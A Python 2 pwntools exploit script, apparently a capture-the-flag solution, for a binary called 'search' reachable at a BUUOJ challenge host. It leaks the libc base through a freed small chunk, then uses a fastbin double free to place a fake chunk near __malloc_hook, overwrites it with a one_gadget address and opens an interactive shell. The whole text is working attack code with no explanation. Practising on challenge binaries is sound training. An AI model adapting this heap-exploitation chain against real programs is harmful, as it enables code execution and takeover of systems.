from pwn import *
context.binary = './search'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20001)
	libc = ELF('./libc.so.6')
else:
	libc = context.binary.libc
	p = process('./search')

def dbg():
	raw_input()

def insert_sentence(sentence):
	p.recvuntil('3: Quit\n')
	p.sendline('2')
	size = len(sentence)
	p.recvuntil('Enter the sentence size:')
	p.sendline(str(size))
	p.recvuntil('Enter the sentence:')
	p.send(sentence)

	print "insert a sentence success!"

def search_word(word):
	p.recvuntil('3: Quit\n')
	p.sendline('1')
	size = len(word)
	p.recvuntil('Enter the word size:')
	p.sendline(str(size))
	p.recvuntil('Enter the word:')
	p.send(word)



#leak libc_base
smallbin_sentence = 'a'*0x88 + ' t '
insert_sentence(smallbin_sentence)
search_word('t')
p.recvuntil('Delete this sentence (y/n)?')
p.sendline('y')						#free the small chunk

search_word('\x00')
p.recvuntil('Found ' + str(len(smallbin_sentence)) + ': ')
libc_base  = u64(p.recv(8)) - 0x3c4b78
print "libc_base ==> " + hex(libc_base)

__malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0xf02a4
print "__malloc_hook ==> " + hex(__malloc_hook)

p.recvuntil('Delete this sentence (y/n)?')
p.sendline('n')
#double free


#sentenct c->b->a
insert_sentence('a'*0x5d+' d ')
insert_sentence('b'*0x5d+' d ')
insert_sentence('c'*0x5d+' d ')

#free all so fastbin a->b->c->null
search_word('d')
p.recvuntil('Delete this sentence (y/n)?')
p.sendline('y')						#free the small chunk
p.recvuntil('Delete this sentence (y/n)?')
p.sendline('y')						#free the small chunk
p.recvuntil('Delete this sentence (y/n)?')
p.sendline('y')						#free the small chunk

#fastbin b->a->b->a->null
search_word('\x00')
p.recvuntil('Delete this sentence (y/n)?')		#b
p.sendline('y')						#free the small chunk
p.recvuntil('Delete this sentence (y/n)?')		#a
p.sendline('n')						#free the small chunk
p.recvuntil('Delete this sentence (y/n)?')	#smallbin_sentence
p.sendline('n')	

#fake_chunk at __malloc_hook
fake_chunk = __malloc_hook - 0x23


insert_sentence(p64(fake_chunk).ljust(0x60, 'f'))			#b, make b->fd = fake_chunk
insert_sentence('a'*0x60)									#a
insert_sentence('a'*0x60)									#b

payload = 'a'*0x13 + p64(one_gadget)
payload = payload.ljust(0x60, 'f')
insert_sentence(payload)						#fake_chunk


p.interactive()
p.close()
